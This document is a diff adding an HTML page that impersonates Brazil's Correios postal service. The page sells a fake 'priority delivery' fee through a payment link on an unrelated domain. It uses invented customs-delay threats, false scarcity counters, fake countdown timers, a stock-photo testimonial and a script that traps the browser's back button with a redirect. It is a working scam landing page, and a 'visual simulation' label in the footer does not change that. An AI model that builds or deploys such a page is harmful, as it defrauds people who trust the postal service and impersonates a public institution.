@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Correios - Entrega Prioritária</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: #f1f3f6;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 600px;
+      margin: 40px auto;
+      background: #ffffff;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 25px rgba(0,0,0,0.1);
+      border-top: 10px solid #f9c600;
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .logo img {
+      height: 60px;
+    }
+    h1 {
+      color: #003399;
+      text-align: center;
+      font-size: 24px;
+    }
+    .confirmation {
+      background: #e8f5e9;
+      color: #2e7d32;
+      padding: 20px;
+      border-left: 6px solid #4CAF50;
+      margin-bottom: 20px;
+      font-size: 16px;
+    }
+    .highlight {
+      background: #fff3e0;
+      padding: 15px;
+      border-left: 6px solid #f57c00;
+      font-size: 16px;
+      margin: 20px 0;
+    }
+    .warning {
+      background: #e3f2fd;
+      color: #01579b;
+      padding: 15px;
+      border-left: 6px solid #0288d1;
+      font-size: 15px;
+      margin: 20px 0;
+      font-weight: bold;
+    }
+    .price-box {
+      background: #e8f0ff;
+      padding: 20px;
+      border: 2px solid #003399;
+      text-align: center;
+      border-radius: 8px;
+      font-size: 18px;
+      color: #003399;
+      margin-bottom: 20px;
+    }
+    .btn-container {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .btn {
+      display: inline-block;
+      padding: 15px 30px;
+      background: #003399;
+      color: white;
+      border: none;
+      font-size: 18px;
+      border-radius: 8px;
+      cursor: pointer;
+      text-align: center;
+      font-weight: bold;
+      animation: pulse 2s infinite;
+      text-decoration: none;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.03); }
+      100% { transform: scale(1); }
+    }
+    .btn:hover {
+      background: #001f66;
+    }
+    .countdown, .order-countdown {
+      font-size: 16px;
+      text-align: center;
+      margin: 15px 0;
+      font-weight: bold;
+    }
+    .countdown {
+      color: red;
+    }
+    .order-countdown {
+      color: #003399;
+    }
+    .testimonial {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      font-style: italic;
+      font-size: 14px;
+      margin-top: 30px;
+      background: #f0f0f0;
+      padding: 15px;
+      border-left: 5px solid #ccc;
+    }
+    .testimonial img {
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+    }
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #999;
+      margin-top: 40px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://logodownload.org/wp-content/uploads/2014/05/correios-logo-5.png" alt="Correios">
+    </div>
+
+    <h1>✅ PAGAMENTO CONFIRMADO COM SUCESSO</h1>
+
+    <div class="confirmation">
+      Obrigado! Sua taxa foi recebida e seu pedido foi <strong>liberado com sucesso.</strong><br>
+      A expedição já foi programada e a entrega convencional ocorrerá nos próximos dias úteis conforme disponibilidade regional.<br><br>
+    </div>
+
+    <div class="highlight" id="entrega-msg">
+      📦 <strong>IMPORTANTE:</strong> Existe uma opção de <u>Entrega Expressa Oficial</u> que garante que seu pacote seja entregue <strong>ainda hoje</strong>, com rastreamento ativo e liberação imediata.<br><br>
+      ⚠️ Sem esse serviço, o pedido segue para <strong>análise manual de importador não recorrente (VINR)</strong>, <strong>homologação logística (FHL)</strong> e <strong>protocolo manual da alfândega</strong>, com previsão de atraso superior a <u>15 dias úteis</u>.<br><br>
+      🔐 <strong>Evite a fila de triagem e receba ainda hoje</strong>, com prioridade máxima no centro de distribuição e envio imediato para rota local.
+    </div>
+
+    <div class="order-countdown">
+      🕐 Disponível por tempo limitado: <span id="order-timer">00:05:00</span>
+    </div>
+
+    <div class="price-box">
+      Ative agora por apenas <strong>R$ 22,78</strong><br>
+      Inclui prioridade de despacho + rastreamento premium + comprovante digital
+    </div>
+
+    <div class="btn-container">
+      <a href="https://pay.paguereceba.top/JqoR32bLqrw3Vj5" class="btn">ATIVAR ENTREGA PRIORITÁRIA</a>
+    </div>
+
+    <div class="countdown">
+      ⏳ Restam apenas 2 liberações expressas disponíveis<br>
+      Oferta expira em <span id="timer">00:05:00</span>
+    </div>
+
+    <div class="testimonial">
+      <img src="https://randomuser.me/api/portraits/men/75.jpg" alt="Carlos T">
+      “Ativei a entrega prioritária e o pedido chegou poucas horas depois. Muito rápido e confiável!” — Carlos T. - MG
+    </div>
+
+    <div class="footer">
+      Sistema Inteligente de Entrega Prioritária - © Correios 2025 (Simulação Visual)
+    </div>
+  </div>
+
+  <script>
+    let upsellTime = 300;
+    let orderWaitTime = 300;
+    const timerEl = document.getElementById('timer');
+    const orderEl = document.getElementById('order-timer');
+    const entregaMsg = document.getElementById('entrega-msg');
+
+    const now = new Date();
+    const hora = now.getHours();
+
+    if (hora >= 17) {
+      entregaMsg.innerHTML = '📦 <strong>IMPORTANTE:</strong> A entrega prioritária garante envio <u>amanhã até 12h</u> sem burocracia, direto do centro de distribuição.';
+    }
+
+    setInterval(() => {
+      if (upsellTime > 0) upsellTime--;
+      if (orderWaitTime > 0) orderWaitTime--;
+
+      const min1 = String(Math.floor(upsellTime / 60)).padStart(2, '0');
+      const sec1 = String(upsellTime % 60).padStart(2, '0');
+      timerEl.textContent = `${min1}:${sec1}`;
+
+      const min2 = String(Math.floor(orderWaitTime / 60)).padStart(2, '0');
+      const sec2 = String(orderWaitTime % 60).padStart(2, '0');
+      orderEl.textContent = `${min2}:${sec2}`;
+    }, 1000);
+
+    history.pushState(null, null, location.href);
+    window.addEventListener('popstate', function () {
+      window.location.href = "../backredirect1";
+    });
+  </script>
+</body>
+</html>
